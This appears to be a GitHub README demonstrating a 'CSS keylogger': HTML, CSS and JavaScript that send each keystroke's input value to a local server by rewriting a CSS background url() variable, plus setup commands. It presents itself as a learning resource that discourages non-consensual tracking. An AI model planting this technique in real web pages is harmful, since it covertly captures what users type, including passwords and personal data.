## CSS Keylogger

This is just a simple **demostration** of how a website could keep track of user interaction via **CSS variables** and url selector values.

By using the **required** attribute for the input text, we can just use a **CSS selector** which validates wether the input text is present calling the url('serverURL') every keyup event.

Every time the user enters some value, the new url for the background is updated via js.

**Note: This code should be used as a learning resource and user tracking without its consent should be discouraged totally.**


## Demo
![](demo.gif)


## index.html

```
    <div>
        <input type="text" id="userText" name="userText" required />
    </div>
```

## main.css

```
:root{
    --keyLogURL: url('http://localhost:3000/user-input');
}


input:valid {
    background: var(--keyLogURL);
    color:green;
}

```

## Javascript ( No AJAX or HTTP request)

```
    // Changing the value of the CSS variable with the new text value
    const inputText = document.getElementById('userText');
    const endpoint = 'user-input';
    const cssVar = '--keyLogURL';
    inputText.addEventListener("keyup", e => {
        const value = e.target.value;
        const cssURL = getComputedStyle(document.documentElement)
            .getPropertyValue(cssVar);
        const cssURLSliced = cssURL.slice(0, cssURL.indexOf(endpoint)) + endpoint;
        const root = document.documentElement;
        root.style.setProperty(cssVar, `${cssURLSliced}?z=${value}`);
    });
```

## How to run the demo

### Install dependencies
```
$ git clone https://github.com/axelgalicia/css-tracking.git
$ npm install
$ npm start
```

Then open the index.html using a server or using Go Live from VS Code and type something. 

Server will capture it.


*Author:* Axel Galicia

Date: May 12, 2019